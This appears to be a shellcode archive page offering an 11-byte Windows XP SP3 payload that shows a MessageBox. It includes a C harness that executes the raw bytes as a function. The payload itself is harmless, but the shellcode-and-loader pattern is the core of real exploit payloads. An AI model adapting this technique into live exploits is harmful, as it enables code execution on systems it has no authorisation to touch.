<html><head><title>Windows - win32/xp pro sp3 MessageBox shellcode - 11 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Title: win32/xp pro sp3 MessageBox shellcode 11 bytes
Author: d3c0der - d3c0der[at]hotmail[dot]com
Tested on: WinXP Pro SP3 (EN)  # ( run MessageBox that show an error message )
website : Www.AttackerZ.ir
spt : All firends ;)
*/
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
 
char code[] =   &quot;\x33\xd2\x52\x52\x52\x52\xe8\xbe\xe9\x44\x7d&quot;;
 
int main(int argc, char **argv)
{
    ((void (*)())code)();
     
    return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
